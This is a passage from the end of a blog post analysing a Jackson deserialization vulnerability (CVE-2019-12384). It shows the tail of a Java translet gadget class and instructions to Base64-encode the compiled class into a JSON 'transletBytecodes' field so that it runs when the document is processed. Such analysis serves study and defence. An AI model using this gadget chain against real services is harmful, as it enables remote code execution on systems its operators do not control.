    <span class="k">while</span> <span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">rd</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">result</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">line</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="n">rd</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
  <span class="o">}</span>

  <span class="nd">@Override</span>
  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xalan</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">xsltc</span><span class="o">.</span><span class="na">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">dtm</span><span class="o">.</span><span class="na">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">serializer</span><span class="o">.</span><span class="na">SerializationHandler</span> <span class="n">handler</span><span class="o">)</span> <span class="o">{</span>
  <span class="o">}</span>

  <span class="nd">@Override</span>
  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xalan</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">xsltc</span><span class="o">.</span><span class="na">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">serializer</span><span class="o">.</span><span class="na">SerializationHandler</span><span class="o">[]</span> <span class="n">handler</span><span class="o">)</span>  <span class="o">{</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><ul><li>This code can be compiled with the <code class="language-plaintext highlighter-rouge">javac</code> compiler,<li>and then the resulting <code class="language-plaintext highlighter-rouge">.class</code> file should be <code class="language-plaintext highlighter-rouge">Base64</code> encoded, and provided to the <code class="language-plaintext highlighter-rouge">transletBytecodes</code> field in the JSON document.<li>As soon as the document is processed, it will create the object, load the code, and execute it.<li>You may still see errors from code failing after the code executes, such as from type-mismatches or the like.</ul><hr /><p>ref</p><ul><li><a href="https://www.anquanke.com/post/id/182695">CVE-2019-12384：Jackson反序列化漏洞分析</a><li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">Jackson gadgets - Anatomy of a vulnerability</a><li><a href="https://xz.aliyun.com/t/7820">Jackson JDOM XSLTransformer Gadget浅析</a><li><a href="https://blog.csdn.net/zy_281870667/article/details/79059564">py</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/10cyberattack/'>10CyberAttack</a>, <a href='/categories/vulnerability/'>Vulnerability</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/cyberattack/" class="post-tag no-text-decoration" >CyberAttack</a> <a href="/tags/vulnerability/" class="post-tag no-text-decoration" >Vulnerability</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Vul - CVE Jackson反序列化漏洞分析 - Grace&url=https://ocholuo.github.io//posts/CVE-Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Vul - CVE Jackson反序列化漏洞分析 - Grace&u=https://ocholuo.github.io//posts/CVE-Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Vul - CVE Jackson反序列化漏洞分析 - Grace&url=https://ocholuo.github.io//posts/CVE-Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Amazon-CloudFront/">AWS Lab - AWS CloudFront</a><li><a href="/posts/Alexa-1stSkill/">AWS Alex First Skill - RedVelvet Time</a><li><a href="/posts/NetworkProtocol-SSL-TLS-Handshake/">NetworkProtocol SSL/TLS Handshake</a><li><a href="/posts/pythonCrash/">Python Crash</a><li><a href="/posts/%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%A7%A3%E9%87%8AAWS/">AWS - 一句话解释AWS</a><li><a href="/posts/GKE/">GCP - Google Cloud Computing - Kubernetes and Kubernetes Engine</a><li><a href="/posts/Go-Note/">Go Note</a><li><a href="/posts/SCPs/">AWS - IdenAccessManage - SCPs (Service Control Policies)</a><li><a href="/posts/CompanyBenefit/">Company Benefit</a><li><a href="/posts/Encryption-SSL&TLS/">Cryptography - SSL/TLS Encryption</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/FireEye12/"><div class="card-body"> <span class="timeago small" >Dec 13, 2020<i class="unloaded">2020-12-13T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vul - FireEye 20201213</h3><div class="text-muted small"><p> [toc] Vulnerability - FireEye 202012 SUNBURST Malware Overview 12142020 DESCRIPTION SUNBURST is a backdoor that has the ability to spawn and kill processes, write and d...</p></div></div></a></div><div class="card"> <a href="/posts/web-cache/"><div class="card-body"> <span class="timeago small" >Dec 21, 2020<i class="unloaded">2020-12-21T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Meow's CyberAttack - - Web cache posion</h3><div class="text-muted small"><p> Meow’s CyberAttack - Web cache posion 背景知识 User Browser Cache Poisoning 浏览器缓存投毒 攻击危害: 攻击实现: Server Cache Poisoning 服务器缓存 ...</p></div></div></a></div><div class="card"> <a href="/posts/CVE-2020-9484/"><div class="card-body"> <span class="timeago small" >Jan 9, 2021<i class="unloaded">2021-01-09T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vul - CVE-2020-9484 Tomcat RCE漏洞分析</h3><div class="text-muted small"><p> CVE-2020-9484 Tomcat RCE漏洞分析 1. 漏洞简述 2. 条件 Tomcat PersistentManager Configuration The exploit 3. 漏洞详情 4. 漏洞复现 ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Googleanalytics/" class="btn btn-outline-primary" prompt="Older"><p>Implement Google Analytics to blog</p></a> <a href="/posts/SystemDesign/" class="btn btn-outline-primary" prompt="Newer"><p>System Design - Key Concepts</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/ocholuo">Grace JyL</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ocholuo.github.io/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/npm/countup.js@1.9.3/dist/countUp.min.js"></script> <script defer src="/assets/js/dist/pvreport.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-179830187-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-179830187-1'); }); </script>
